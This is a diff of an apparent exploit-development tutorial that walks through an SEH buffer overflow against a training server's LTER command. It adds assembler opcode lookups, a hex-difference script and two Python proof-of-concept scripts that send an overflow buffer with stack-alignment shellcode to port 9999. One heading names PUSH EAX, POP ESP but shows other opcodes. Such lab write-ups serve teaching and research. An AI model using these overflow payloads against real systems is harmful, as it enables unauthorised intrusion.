@@ -223,7 +223,7 @@ s.close()
 
 ##### The order of these alignments would be the following:
 
-+ The value of ESP is inserted into EAX in order to perform calculations, and in EBX, just as a backup when it is time to execute the shellcode, as if the ESP has a similar address, it will mangle the entire execution!
++ The value of ESP is inserted into EAX in order to perform calculations, and in EBX, just as a backup when it is time to execute the shellcode, as if the ESP has a similar address, it may execute your shellcode, but it will definitely crash the execution!
 
 + It will be added to ax as much as needed in order to reach near the end of the buffer.
 
@@ -236,3 +236,114 @@ s.close()
 + This value is popped into ESI.
 
 + The SUB/ADD encoded series of 4 instructed will be sent: PUSH EBX, POP ESP; PUSH ESI, RET. This will push the value of EBX into the stack and pop it into ESP, and after that pushing ESI into the stack and then return the address through RET. 
+
+##### Getting the opcodes for PUSH ESP, POP EAX; PUSH ESP, POP EBX. Also, i made sure to no longer use C's as their instruction is INC EBX, this would mean that the value of EBX would be constantly incremented, something we do not want, right?
+
+```term
+root@whitecr0wz:~# msf-nasm_shell 
+nasm > PUSH ESP
+P00000000  54                push esp
+nasm > POP EAX
+00000000  58                pop eax
+nasm > PUSH ESP
+00000000  54                push esp
+nasm > POP EBX
+00000000  5B                pop ebx
+nasm > 
+```
+
+###### PoC code:
+
+```term
+import socket, sys, struct
+
+alignment = ""
+alignment += "\x54\x58\x54\x5B"
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x6250195E)
+
+buffer = "LTER /.:/" + "A" * 3515 + nseh + seh + "A" * 2 + alignment + "A" * 200
+
+host = sys.argv[1]
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host, 9999))
+
+s.send(buffer)
+
+s.close()
+```
+
+##### Once the alignment is executed, it can be seen how EAX has the same value as ESP.
+
+![](/assets/img/LTER/10.png)
+
+##### The next step, is to turn the value of EAX near the end of the stack. The address i chose to perform the calculations is 0x017BFFFC.
+
+![](/assets/img/LTER/11.png)
+
+##### The next step, is to calculate the difference between 0x017BFFFC and 0x017BECA4, which can be easily done with the following program.
+
+```term
+#!/bin/bash
+
+printf "0x%X\n" $(($1 - $2))
+```
+
+```term
+root@whitecr0wz:~/Exploit-Dev/LTER# hexcalc 0x017BFFFC 0x017BECA4 
+0x1358
+root@whitecr0wz:~/Exploit-Dev/LTER# 
+```
+
+##### As given, 0x1358 is the value needed to add to 0x017BECA4 in order to become 0x017BFFFC.
+
+##### The opcodes for such operation are found in msf-nasm_shell.
+
+```term
+nasm > add ax, 0x1358
+00000000  66055813          add ax,0x1358
+nasm > 
+```
+
+##### The next step is to find the opcodes of PUSH EAX, POP ESP, this is done once again in msf-nasm_shell.
+
+```term
+nasm > PUSH ESP
+00000000  54                push esp
+nasm > POP EBX
+00000000  5B                pop ebx
+nasm > 
+```
+
+###### PoC code:
+
+```term
+import socket, sys, struct
+
+alignment = ""
+alignment += "\x54\x58\x54\x5B"
+alignment += "\x66\x05\x58\x13"
+alignment += "\x50\x5C"
+
+nseh = struct.pack("<I", 0x06710870)
+seh = struct.pack("<I", 0x6250195E)
+
+buffer = "LTER /.:/" + "A" * 3515 + nseh + seh + "A" * 2 + alignment + "A" * 200
+
+host = sys.argv[1]
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+s.connect((host, 9999))
+
+s.send(buffer)
+
+s.close()
+```
+
+##### The alignment seems to have done its work as intended.
+
+![](/assets/img/LTER/12.png)
